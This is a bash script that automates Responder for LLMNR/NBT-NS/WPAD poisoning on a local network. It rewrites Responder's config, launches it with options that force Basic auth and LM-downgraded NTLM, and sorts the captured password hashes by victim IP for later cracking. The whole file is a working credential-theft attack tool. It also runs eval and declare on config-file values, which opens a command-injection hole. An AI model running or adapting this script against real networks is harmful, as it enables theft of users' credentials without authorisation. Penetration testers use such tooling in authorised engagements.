#!/bin/bash

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
hashes_dir="$script_dir/hashes"
log_dir="/usr/share/responder/logs"

# Update settings from configuration file
LLMNRAutomation_conf="$script_dir/LLMNRAutomation.conf"
Responder_conf="/usr/share/responder/Responder.conf"

# Function to strip leading and trailing whitespace
trim() {
    echo "$1" | awk '{$1=$1};1'
}

# Read the configuration file
while IFS='=' read -r key value; do
    key=$(trim "$key")
    value=$(trim "$value")

    # Skip comments
    if [[ $key =~ ^#|^$ ]]; then
        continue
    fi

    declare "$key=$value"

    # Update Responder configuration file if key exists
    if grep -q "^[[:space:]]*$key[[:space:]]*=" "$Responder_conf"; then
        sed -i "/^[[:space:]]*$key[[:space:]]*=/ s/=.*/= $value/" "$Responder_conf"
    fi
done < "$LLMNRAutomation_conf"

# Function to check if a string is a valid IPv4 address for external IP flag
is_valid_ipv4() {
    local ipv4=$1
    if [[ "$ipv4" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
        return 0
    else
        return 1
    fi
}

# Run responder
run_responder() {
    local cmd="sudo responder"
    cmd+=" -I $Interface"
    if [ "$WPAD" = "On" ]; then
        cmd+=" -wd"
    fi
    if [ "$AuthMethod" = "Basic" ]; then
        cmd+=" -b"
    fi
    if [ "$WPAD" = "On" ] && [ "$AuthMethod" = "Basic" ]; then
        cmd+="F"
    fi
    if [ "$DNS_DHCP" = "On" ]; then
        cmd+=" -D"
    fi
    if [ "$Address" != "None" ] && is_valid_ipv4 "$Address"; then
        cmd+=" -e $Address"
    fi
    if [ "$AuthMethod" != "NTLMv2-SSP" ]; then
        cmd+=" --lm --disable-ess"
    fi
    echo "Running responder with command: $cmd"

    eval "$cmd"
}

# Hash file filtering
handle_hashes() {
    mkdir -p "$hashes_dir"

    # Move hash files to appropriate folders
    for file in "$log_dir"/*.txt; do
        if [ -f "$file" ]; then
            # Extract IP address from the file name
            ip=$(basename "$file" | grep -oP '(?<=-)([0-9a-f.:]+)')
            mkdir -p "$hashes_dir/$ip"
            cp "$file" "$hashes_dir/$ip/$(basename "$file")"
        fi
    done
}

# Output IP addresses and usernames to choose for cracking
output() {
    echo "To start cracking, specify target ip with -i and target username with -u (e.g. sudo ./LLMNRAutomation.sh -c -i 10.0.2.15 -u user1)"
    for file in "$hashes_dir"/*/*.txt; do
        ip=$(basename "$(dirname "$file")")
        echo "IP: $ip"
        awk -F:: '{print $1}' "$file"
        echo
    done
}

main() {
    # Extract interface from Responder config
    Interface=$(grep -oP '^Interface\s*=\s*\K.*' "$LLMNRAutomation_conf" | tr -d '[:space:]')

    if [ "$1" = "-c" ]; then
        output
    else
        run_responder
        handle_hashes
    fi
}

main "$@"